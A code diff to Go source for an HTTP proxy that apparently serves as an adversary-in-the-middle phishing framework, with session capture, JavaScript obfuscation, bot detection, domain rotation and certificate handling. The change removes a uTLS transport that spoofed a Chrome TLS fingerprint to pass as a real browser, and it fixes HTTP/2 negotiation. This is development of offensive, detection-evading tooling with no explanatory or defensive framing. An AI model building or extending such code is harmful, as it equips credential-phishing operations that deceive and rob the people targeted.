@@ -10,7 +10,6 @@ package core
 import (
 	"bufio"
 	"bytes"
-	"context"
 	cryptorand "crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
@@ -86,7 +85,6 @@ type HttpProxy struct {
 	polymorphicEngine *PolymorphicEngine
 	obfuscator        *JSObfuscator
 	sessionFormatter  *SessionFormatter
-	utlsTransport     *UTLSTransport
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -147,7 +145,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		polymorphicEngine: nil, // Will be initialized based on config
 		obfuscator:        NewJSObfuscator(cfg),
 		sessionFormatter:  NewSessionFormatter(),
-		utlsTransport:     NewUTLSTransport(FingerprintChrome, true, cfg.IsHttp2Enabled()), // Enable Chrome TLS fingerprint by default
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -203,13 +200,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		mlConfig := cfg.GetMLDetectorConfig()
 		p.mlDetector = NewMLBotDetector(mlConfig.Threshold, p.tlsInterceptor)
 		log.Info("ML bot detector enabled with threshold: %.2f", mlConfig.Threshold)
-	}
-
-	// Configure goproxy to use uTLS transport for outbound connections
-	// This spoofs the TLS fingerprint to look like a real browser
-	if p.utlsTransport != nil && p.utlsTransport.IsEnabled() {
-		p.Proxy.Tr = p.utlsTransport.GetTransport()
-		log.Info("uTLS enabled with %s fingerprint for outbound connections", p.utlsTransport.GetFingerprintName())
 	}
 
 	// Initialize domain rotation if enabled
@@ -268,17 +258,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
-
-			// Detect TLS fingerprint from User-Agent and inject into context
-			if p.utlsTransport != nil && p.utlsTransport.IsEnabled() {
-				ua := req.Header.Get("User-Agent")
-				fp := DetermineFingerprint(ua)
-				// Create new context with fingerprint
-				// Note: req.Clone(ctx) or req.WithContext(ctx) is needed
-				c := context.WithValue(req.Context(), FingerprintContextKey, fp)
-				req = req.WithContext(c)
-				log.Debug("assigned TLS fingerprint: %s (UA: %s)", fp, ua)
-			}
 
 			// -------------------------------------------------------------------------
 			// REFACTORED: Chain of Responsibility (Middleware)
@@ -1967,11 +1946,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 		if !p.developer {
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			if p.cfg.IsHttp2Enabled() {
-				tls_cfg.NextProtos = []string{"h2", "http/1.1", tlsalpn01.ACMETLS1Protocol}
-			} else {
-				tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol}
-			}
+			tls_cfg.NextProtos = []string{"h2", "http/1.1", tlsalpn01.ACMETLS1Protocol}
 
 			return tls_cfg, nil
 		} else {
@@ -2444,9 +2419,6 @@ func (p *HttpProxy) getClientIdentifier(req *http.Request) string {
 }
 
 func (p *HttpProxy) SetHttp2Enabled(enabled bool) {
-	if p.utlsTransport != nil {
-		p.utlsTransport.SetHttp2Enabled(enabled)
-	}
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
